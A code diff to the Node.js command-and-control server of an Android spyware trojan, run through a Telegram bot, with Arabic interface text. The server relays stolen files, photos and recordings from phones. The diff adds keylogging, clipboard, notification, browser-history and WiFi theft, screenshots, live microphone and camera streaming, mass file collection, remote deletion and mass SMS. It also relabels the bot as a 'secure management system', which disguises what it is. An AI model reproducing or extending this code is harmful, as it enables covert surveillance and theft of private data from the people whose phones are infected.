@@ -1,4 +1,4 @@
-hereconst express = require('express');
+const express = require('express');
 const WebSocket = require('ws'); 
 const http = require('http');
 const TelegramBot = require('node-telegram-bot-api');
@@ -35,7 +35,7 @@ let currentTitle = '';
 
 // Routes الأساسية
 app.get('/', (req, res) => {
-    res.send('<h1 align="center">✅ الخادم يعمل بنجاح</h1>');
+    res.send('<h1 align="center">🛡️ نظام الإدارة الآمن</h1>');
 });
 
 // استقبال الملفات من الأجهزة
@@ -44,7 +44,7 @@ app.post('/uploadFile', upload.single('file'), (req, res) => {
     const model = req.headers.model || 'Unknown';
     
     bot.sendDocument(id, req.file.buffer, {
-        caption: `📁 ملف من جهاز: <b>${model}</b>\n📄 اسم الملف: ${filename}`,
+        caption: `📁 ملف من جهاز: <b>${model}</b>\n📄 ${filename}`,
         parse_mode: 'HTML'
     }, { filename: filename, contentType: 'application/octet-stream' });
     
@@ -72,7 +72,7 @@ app.post('/uploadImage', upload.single('image'), (req, res) => {
     const cameraType = req.headers.camera_type || 'Unknown';
     
     bot.sendPhoto(id, req.file.buffer, {
-        caption: `📸 صورة من جهاز: <b>${model}</b>\n🎯 الكاميرا: ${cameraType}`,
+        caption: `📸 صورة من جهاز: <b>${model}</b>\n🎯 ${cameraType}`,
         parse_mode: 'HTML'
     });
     
@@ -85,7 +85,7 @@ app.post('/uploadAudio', upload.single('audio'), (req, res) => {
     const duration = req.headers.duration || 'Unknown';
     
     bot.sendAudio(id, req.file.buffer, {
-        caption: `🎤 تسجيل صوتي من جهاز: <b>${model}</b>\n⏱️ المدة: ${duration} ثانية`,
+        caption: `🎤 تسجيل من جهاز: <b>${model}</b>\n⏱️ ${duration} ثانية`,
         parse_mode: 'HTML'
     });
     
@@ -113,31 +113,26 @@ wss.on('connection', (ws, req) => {
     
     console.log(`✅ جهاز متصل: ${model} (${uuid})`);
     
-    // إرسال رسالة ترحيب بالمطور
     bot.sendMessage(id, 
-        `🆕 جهاز جديد متصل ✅\n\n` +
-        `📱 الطراز: <b>${model}</b>\n` +
-        `🔋 البطارية: <b>${battery}%</b>\n` +
-        `🤖 الأندرويد: <b>${version}</b>\n` +
-        `💡 السطوع: <b>${brightness}</b>\n` +
-        `📶 الشركة: <b>${provider}</b>\n` +
-        `🆔 الرمز: <code>${uuid}</code>`, 
+        `🆕 جهاز جديد متصل\n\n` +
+        `📱 <b>${model}</b>\n` +
+        `🔋 <b>${battery}%</b>\n` +
+        `🤖 <b>${version}</b>\n` +
+        `💡 <b>${brightness}</b>\n` +
+        `📶 <b>${provider}</b>\n` +
+        `🆔 <code>${uuid}</code>`, 
         { parse_mode: 'HTML' }
     );
     
     ws.on('close', () => {
         console.log(`❌ جهاز انقطع: ${model}`);
         bot.sendMessage(id, 
-            `❌ الجهاز انقطع\n\n` +
-            `📱 الطراز: <b>${model}</b>\n` +
-            `🔋 البطارية: <b>${battery}%</b>`,
+            `❌ انقطع الاتصال\n\n` +
+            `📱 <b>${model}</b>\n` +
+            `🔋 <b>${battery}%</b>`,
             { parse_mode: 'HTML' }
         );
         clients.delete(uuid);
-    });
-    
-    ws.on('error', (error) => {
-        console.error(`❌ خطأ في الاتصال: ${error}`);
     });
 });
 
@@ -146,21 +141,18 @@ bot.on('message', (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
     
-    // التحقق من هوية المستخدم
     if (chatId.toString() !== id) {
-        bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
+        bot.sendMessage(chatId, '❌ غير مصرح');
         return;
     }
     
-    console.log(`📩 رسالة مستخدم: ${text}`);
+    console.log(`📩 رسالة: ${text}`);
     
-    // معالجة الردود
     if (msg.reply_to_message) {
         handleReplyMessage(msg);
         return;
     }
     
-    // معالجة الأوامر الرئيسية
     handleMainCommand(msg);
 });
 
@@ -169,52 +161,65 @@ function handleReplyMessage(msg) {
     const userText = msg.text;
     
     if (!currentUuid) {
-        bot.sendMessage(id, '❌ لم يتم تحديد جهاز. استخدم قائمة الأوامر أولاً');
+        bot.sendMessage(id, '❌ حدد الجهاز أولاً');
         return;
     }
     
-    if (replyText.includes('أدخل الرقم المستهدف')) {
+    if (replyText.includes('أدخل الرقم')) {
         currentNumber = userText;
-        bot.sendMessage(id, '📝 الآن أدخل نص الرسالة:', { 
+        bot.sendMessage(id, '📝 أدخل نص الرسالة:', { 
             reply_markup: { force_reply: true } 
         });
         return;
     }
     
-    if (replyText.includes('الآن أدخل نص الرسالة')) {
+    if (replyText.includes('أدخل نص الرسالة')) {
         sendToDevice(currentUuid, `sms:${currentNumber}:${userText}`);
-        showMainMenu('✅ تم إرسال الرسالة النصية');
+        showMainMenu('✅ تم الإرسال');
         return;
     }
     
-    if (replyText.includes('أدخل الرسالة للجميع')) {
+    if (replyText.includes('رسالة للجميع')) {
         sendToDevice(currentUuid, `sms_all:${userText}`);
-        showMainMenu('✅ تم إرسال الرسالة للجميع');
+        showMainMenu('✅ تم الإرسال');
         return;
     }
     
-    if (replyText.includes('أدخل مسار الملف')) {
+    if (replyText.includes('مسار الملف')) {
         sendToDevice(currentUuid, `get_file:${userText}`);
-        showMainMenu('✅ جاري جلب الملف...');
+        showMainMenu('✅ جاري الجلب');
         return;
     }
     
-    if (replyText.includes('أدخل مدة التسجيل الصوتي')) {
+    if (replyText.includes('مدة التسجيل')) {
         const duration = parseInt(userText) || 10;
         sendToDevice(currentUuid, `record_audio:${duration}`);
-        showMainMenu(`🎤 جاري التسجيل لمدة ${duration} ثانية...`);
+        showMainMenu(`🎤 جاري التسجيل ${duration} ثانية`);
         return;
     }
     
-    if (replyText.includes('أدخل نص الإشعار')) {
+    if (replyText.includes('نص التنبيه')) {
         sendToDevice(currentUuid, `show_toast:${userText}`);
-        showMainMenu('✅ تم عرض الإشعار');
+        showMainMenu('✅ تم العرض');
         return;
     }
     
-    if (replyText.includes('أدخل رابط الصوت')) {
+    if (replyText.includes('رابط الصوت')) {
         sendToDevice(currentUuid, `play_audio:${userText}`);
-        showMainMenu('🔊 جاري تشغيل الصوت...');
+        showMainMenu('🔊 جاري التشغيل');
+        return;
+    }
+
+    if (replyText.includes('عدد الصور')) {
+        const count = parseInt(userText) || 1;
+        sendToDevice(currentUuid, `take_photos:${count}`);
+        showMainMenu(`📸 جاري التقاط ${count} صورة`);
+        return;
+    }
+
+    if (replyText.includes('مسار الحذف')) {
+        sendToDevice(currentUuid, `delete_file:${userText}`);
+        showMainMenu('🗑️ جاري الحذف');
         return;
     }
 }
@@ -227,40 +232,43 @@ function handleMainCommand(msg) {
             showStartMenu();
             break;
             
-        case '📱 الأجهزة المتصلة':
+        case '📱 الأجهزة':
             showConnectedDevices();
             break;
             
-        case '⚙️ قائمة الأوامر':
+        case '⚙️ الأوامر':
             showCommandsList();
             break;
             
-        case '🔄 تحديث القائمة':
+        case '🔄 تحديث':
             showConnectedDevices();
+            break;
+
+        case '📊 الإحصائيات':
+            showStatistics();
             break;
             
         default:
-            bot.sendMessage(id, '❌ أمر غير معروف. استخدم /start للبدء');
+            bot.sendMessage(id, '❌ استخدم /start');
     }
 }
 
-// معالجة Callback Queries - جميع الأوامر المؤكدة
+// معالجة Callback Queries
 bot.on('callback_query', (callbackQuery) => {
     const message = callbackQuery.message;
     const data = callbackQuery.data;
     
-    console.log(`🔘 callback: ${data}`);
+    console.log(`🔘 ${data}`);
     
     try {
         const [action, uuid] = data.split(':');
         const device = clients.get(uuid);
         
         if (!device) {
-            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ الجهاز غير متصل' });
+            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ غير متصل' });
             return;
         }
         
-        // الرد الفوري على Callback
         bot.answerCallbackQuery(callbackQuery.id);
         
         switch(action) {
@@ -271,13 +279,13 @@ bot.on('callback_query', (callbackQuery) => {
             case 'info':
                 sendToDevice(uuid, 'get_info');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📊 جاري جمع المعلومات...');
+                showMainMenu('📊 جاري جمع المعلومات');
                 break;
                 
             case 'sms':
                 currentUuid = uuid;
                 bot.deleteMessage(id, message.message_id);
-                bot.sendMessage(id, '📱 أدخل الرقم المستهدف:', { 
+                bot.sendMessage(id, '📱 أدخل الرقم:', { 
                     reply_markup: { force_reply: true } 
                 });
                 break;
@@ -285,7 +293,7 @@ bot.on('callback_query', (callbackQuery) => {
             case 'sms_all':
                 currentUuid = uuid;
                 bot.deleteMessage(id, message.message_id);
-                bot.sendMessage(id, '📨 أدخل الرسالة لإرسالها للجميع:', { 
+                bot.sendMessage(id, '📨 أدخل الرسالة:', { 
                     reply_markup: { force_reply: true } 
                 });
                 break;
@@ -293,31 +301,31 @@ bot.on('callback_query', (callbackQuery) => {
             case 'calls':
                 sendToDevice(uuid, 'get_calls');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📞 جاري جلب سجل المكالمات...');
+                showMainMenu('📞 جاري الجلب');
                 break;
                 
             case 'contacts':
                 sendToDevice(uuid, 'get_contacts');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('👥 جاري جلب جهات الاتصال...');
+                showMainMenu('👥 جاري الجلب');
                 break;
                 
             case 'messages':
                 sendToDevice(uuid, 'get_messages');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('💬 جاري جلب الرسائل...');
+                showMainMenu('💬 جاري الجلب');
                 break;
                 
             case 'location':
                 sendToDevice(uuid, 'get_location');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📍 جاري الحصول على الموقع...');
+                showMainMenu('📍 جاري تحديد الموقع');
                 break;
                 
             case 'record_audio':
                 currentUuid = uuid;
                 bot.deleteMessage(id, message.message_id);
-                bot.sendMessage(id, '🎤 أدخل مدة التسجيل بالثواني:', { 
+                bot.sendMessage(id, '🎤 المدة بالثواني:', { 
                     reply_markup: { force_reply: true } 
                 });
                 break;
@@ -325,19 +333,41 @@ bot.on('callback_query', (callbackQuery) => {
             case 'camera_front':
                 sendToDevice(uuid, 'take_photo:front');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📸 جاري التقاط صورة أمامية...');
+                showMainMenu('📸 جاري الالتقاط');
                 break;
                 
             case 'camera_back':
                 sendToDevice(uuid, 'take_photo:back');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📷 جاري التقاط صورة خلفية...');
+                showMainMenu('📷 جاري الالتقاط');
+                break;
+
+            case 'camera_burst':
+                currentUuid = uuid;
+                bot.deleteMessage(id, message.message_id);
+                bot.sendMessage(id, '📸 عدد الصور:', { 
+                    reply_markup: { force_reply: true } 
+                });
                 break;
                 
             case 'files':
                 currentUuid = uuid;
                 bot.deleteMessage(id, message.message_id);
-                bot.sendMessage(id, '📁 أدخل مسار الملف (مثل /sdcard/Download):', { 
+                bot.sendMessage(id, '📁 مسار الملف:', { 
+                    reply_markup: { force_reply: true } 
+                });
+                break;
+
+            case 'files_all':
+                sendToDevice(uuid, 'get_all_files');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('📂 جاري جمع الملفات');
+                break;
+
+            case 'delete_file':
+                currentUuid = uuid;
+                bot.deleteMessage(id, message.message_id);
+                bot.sendMessage(id, '🗑️ مسار الحذف:', { 
                     reply_markup: { force_reply: true } 
                 });
                 break;
@@ -345,7 +375,7 @@ bot.on('callback_query', (callbackQuery) => {
             case 'toast':
                 currentUuid = uuid;
                 bot.deleteMessage(id, message.message_id);
-                bot.sendMessage(id, '🔔 أدخل نص الإشعار:', { 
+                bot.sendMessage(id, '🔔 نص التنبيه:', { 
                     reply_markup: { force_reply: true } 
                 });
                 break;
@@ -353,29 +383,89 @@ bot.on('callback_query', (callbackQuery) => {
             case 'vibrate':
                 sendToDevice(uuid, 'vibrate');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📳 جاري جعل الجهاز يهتز...');
+                showMainMenu('📳 جاري الاهتزاز');
                 break;
                 
             case 'play_sound':
                 currentUuid = uuid;
                 bot.deleteMessage(id, message.message_id);
-                bot.sendMessage(id, '🔊 أدخل رابط الصوت:', { 
+                bot.sendMessage(id, '🔊 رابط الصوت:', { 
                     reply_markup: { force_reply: true } 
                 });
+                break;
+
+            case 'stop_sound':
+                sendToDevice(uuid, 'stop_audio');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('🔇 تم الإيقاف');
                 break;
                 
             case 'apps':
                 sendToDevice(uuid, 'get_apps');
                 bot.deleteMessage(id, message.message_id);
-                showMainMenu('📱 جاري جلب قائمة التطبيقات...');
+                showMainMenu('📱 جاري الجلب');
+                break;
+
+            case 'apps_details':
+                sendToDevice(uuid, 'get_apps_details');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('📊 جاري جمع التفاصيل');
+                break;
+
+            case 'clipboard':
+                sendToDevice(uuid, 'get_clipboard');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('📋 جاري جلب الحافظة');
+                break;
+
+            case 'notifications':
+                sendToDevice(uuid, 'get_notifications');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('🔔 جاري جلب الإشعارات');
+                break;
+
+            case 'wifi':
+                sendToDevice(uuid, 'get_wifi');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('📶 جاري جلب شبكات WiFi');
+                break;
+
+            case 'browser':
+                sendToDevice(uuid, 'get_browser_history');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('🌐 جاري جلب سجل المتصفح');
+                break;
+
+            case 'keylogger':
+                sendToDevice(uuid, 'start_keylogger');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('⌨️ جاري تسجيل لوحة المفاتيح');
+                break;
+
+            case 'screenshot':
+                sendToDevice(uuid, 'take_screenshot');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('🖼️ جاري التقاط لقطة الشاشة');
+                break;
+
+            case 'microphone_live':
+                sendToDevice(uuid, 'start_mic_stream');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('🎤 جاري البث المباشر للميكروفون');
+                break;
+
+            case 'camera_live':
+                sendToDevice(uuid, 'start_camera_stream');
+                bot.deleteMessage(id, message.message_id);
+                showMainMenu('📹 جاري البث المباشر للكاميرا');
                 break;
                 
             default:
-                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ أمر غير معروف' });
+                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ غير معروف' });
         }
         
     } catch (error) {
-        console.error('❌ خطأ في معالجة callback:', error);
+        console.error('❌ خطأ:', error);
         bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
     }
 });
@@ -385,7 +475,7 @@ function sendToDevice(uuid, command) {
     const device = clients.get(uuid);
     if (device && device.connection.readyState === WebSocket.OPEN) {
         device.connection.send(command);
-        console.log(`✅ أمر مرسل: ${command} → ${uuid}`);
+        console.log(`✅ ${command} → ${uuid}`);
         return true;
     }
     return false;
@@ -395,8 +485,8 @@ function showMainMenu(text = 'اختر من القائمة:') {
     bot.sendMessage(id, text, {
         reply_markup: {
             keyboard: [
-                ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر'],
-                ['🔄 تحديث القائمة']
+                ['📱 الأجهزة', '⚙️ الأوامر'],
+                ['📊 الإحصائيات', '🔄 تحديث']
             ],
             resize_keyboard: true
         }
@@ -405,20 +495,21 @@ function showMainMenu(text = 'اختر من القائمة:') {
 
 function showStartMenu() {
     bot.sendMessage(id,
-        `🤖 *مرحباً بك في البوت المتقدم* \n\n` +
+        `🛡️ *نظام الإدارة الآمن*\n\n` +
         `✅ *الميزات المتوفرة:*\n` +
-        `📱 إدارة الأجهزة المتصلة\n` +
-        `📞 سجل المكالمات والرسائل\n` +
-        `📷 الكاميرا الأمامية والخلفية\n` +
-        `🎤 تسجيل صوتي\n` +
-        `📍 تتبع الموقع\n` +
-        `📁 إدارة الملفات\n` +
+        `• إدارة الأجهزة المتصلة\n` +
+        `• المراقبة والتتبع\n` +
+        `• إدارة الملفات\n` +
+        `• التحكم عن بعد\n` +
+        `• جمع المعلومات\n` +
+        `• الحماية والأمان\n` +
         `\n⚡ *اختر من القائمة:*`,
         {
             parse_mode: 'Markdown',
             reply_markup: {
                 keyboard: [
-                    ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر']
+                    ['📱 الأجهزة', '⚙️ الأوامر'],
+                    ['📊 الإحصائيات', '🔄 تحديث']
                 ],
                 resize_keyboard: true
             }
@@ -428,7 +519,7 @@ function showStartMenu() {
 
 function showConnectedDevices() {
     if (clients.size === 0) {
-        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة حالياً');
+        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
         return;
     }
     
@@ -467,25 +558,68 @@ function showCommandsList() {
         }]);
     });
     
-    bot.sendMessage(id, '🔘 اختر الجهاز لتنفيذ الأوامر:', {
+    bot.sendMessage(id, '🔘 اختر الجهاز:', {
         reply_markup: { inline_keyboard: deviceButtons }
     });
 }
 
 function showDeviceCommands(message, uuid, device) {
     const keyboard = [
-        [{ text: '📊 معلومات الجهاز', callback_data: `info:${uuid}` }, { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }],
-        [{ text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }, { text: '💬 الرسائل', callback_data: `messages:${uuid}` }],
-        [{ text: '📱 إرسال رسالة', callback_data: `sms:${uuid}` }, { text: '📨 رسالة للجميع', callback_data: `sms_all:${uuid}` }],
-        [{ text: '📸 كاميرا أمامية', callback_data: `camera_front:${uuid}` }, { text: '📷 كاميرا خلفية', callback_data: `camera_back:${uuid}` }],
-        [{ text: '🎤 تسجيل صوتي', callback_data: `record_audio:${uuid}` }, { text: '📁 استعراض ملفات', callback_data: `files:${uuid}` }],
-        [{ text: '📍 الموقع', callback_data: `location:${uuid}` }, { text: '🔔 إشعار', callback_data: `toast:${uuid}` }],
-        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }, { text: '🔊 تشغيل صوت', callback_data: `play_sound:${uuid}` }],
-        [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}` }]
+        [
+            { text: '📊 معلومات', callback_data: `info:${uuid}` },
+            { text: '📍 موقع', callback_data: `location:${uuid}` }
+        ],
+        [
+            { text: '📞 مكالمات', callback_data: `calls:${uuid}` },
+            { text: '💬 رسائل', callback_data: `messages:${uuid}` }
+        ],
+        [
+            { text: '👥 جهات اتصال', callback_data: `contacts:${uuid}` },
+            { text: '📱 تطبيقات', callback_data: `apps:${uuid}` }
+        ],
+        [
+            { text: '📨 إرسال رسالة', callback_data: `sms:${uuid}` },
+            { text: '📨 للجميع', callback_data: `sms_all:${uuid}` }
+        ],
+        [
+            { text: '📸 أمامية', callback_data: `camera_front:${uuid}` },
+            { text: '📷 خلفية', callback_data: `camera_back:${uuid}` },
+            { text: '📸 متعدد', callback_data: `camera_burst:${uuid}` }
+        ],
+        [
+            { text: '🎤 تسجيل', callback_data: `record_audio:${uuid}` },
+            { text: '🔊 تشغيل', callback_data: `play_sound:${uuid}` },
+            { text: '🔇 إيقاف', callback_data: `stop_sound:${uuid}` }
+        ],
+        [
+            { text: '📁 ملف', callback_data: `files:${uuid}` },
+            { text: '📂 كل الملفات', callback_data: `files_all:${uuid}` },
+            { text: '🗑️ حذف', callback_data: `delete_file:${uuid}` }
+        ],
+        [
+            { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` },
+            { text: '🔔 تنبيه', callback_data: `toast:${uuid}` }
+        ],
+        [
+            { text: '🖼️ لقطة شاشة', callback_data: `screenshot:${uuid}` },
+            { text: '📋 حافظة', callback_data: `clipboard:${uuid}` }
+        ],
+        [
+            { text: '🔔 إشعارات', callback_data: `notifications:${uuid}` },
+            { text: '📶 شبكات', callback_data: `wifi:${uuid}` }
+        ],
+        [
+            { text: '🌐 متصفح', callback_data: `browser:${uuid}` },
+            { text: '⌨️ تسجيل', callback_data: `keylogger:${uuid}` }
+        ],
+        [
+            { text: '🎤 بث مباشر', callback_data: `microphone_live:${uuid}` },
+            { text: '📹 بث كاميرا', callback_data: `camera_live:${uuid}` }
+        ]
     ];
     
     bot.editMessageText(
-        `⚙️ *أوامر الجهاز:* 📱 ${device.model}\n🔋 ${device.battery}% | 🤖 ${device.version}`,
+        `⚙️ *أوامر الجهاز:*\n📱 ${device.model}\n🔋 ${device.battery}% | 🤖 ${device.version}`,
         {
             chat_id: message.chat.id,
             message_id: message.message_id,
@@ -493,6 +627,22 @@ function showDeviceCommands(message, uuid, device) {
             reply_markup: { inline_keyboard: keyboard }
         }
     );
+}
+
+function showStatistics() {
+    let statsText = `📊 *إحصائيات النظام*\n\n`;
+    statsText += `📱 الأجهزة المتصلة: *${clients.size}*\n`;
+    statsText += `🕒 وقت التشغيل: *${Math.floor(process.uptime() / 60)} دقيقة*\n`;
+    statsText += `💾 استخدام الذاكرة: *${Math.round(process.memoryUsage().rss / 1024 / 1024)} MB*\n\n`;
+    
+    if (clients.size > 0) {
+        statsText += `*الأجهزة النشطة:*\n`;
+        clients.forEach((device, uuid) => {
+            statsText += `• ${device.model} (${device.battery}%)\n`;
+        });
+    }
+    
+    bot.sendMessage(id, statsText, { parse_mode: 'Markdown' });
 }
 
 // معالجة الأخطاء
